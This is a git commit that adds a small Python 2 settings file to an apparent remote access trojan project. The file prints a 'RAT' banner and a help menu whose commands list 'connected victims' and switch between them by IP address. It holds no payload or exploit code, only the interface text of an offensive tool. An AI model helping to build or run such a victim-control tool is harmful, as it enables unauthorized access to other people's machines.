079efd82f34f1b6d7e89d42184f4ee82a915baf5
Mr-00007 <55259357+Mr-00007@users.noreply.github.com>
2019-10-24 22:58:07 +0100

    Create Settings.py

---
+++ Tools/Settings.py
@@ -0,0 +1,14 @@
+def banner():
+    print "\t▒█▀▀█ ░█▀▀█ ▀▀█▀▀ ".decode('utf-8')
+    print "\t▒█▄▄▀ ▒█▄▄█ ░▒█░░ ".decode('utf-8')
+    print "\t▒█░▒█ ▒█░▒█ ░▒█░░ ".decode('utf-8')
+    print "\n"
+    print "Hey :) welcome to Rat type help for help\n\n"
+
+
+def helper():
+    print "\n[*] list         You can use list command to show all connected victims"
+    print "[*] select       This command let you switch between victims exemple: select 127.0.0.1\n"
+    
+
+
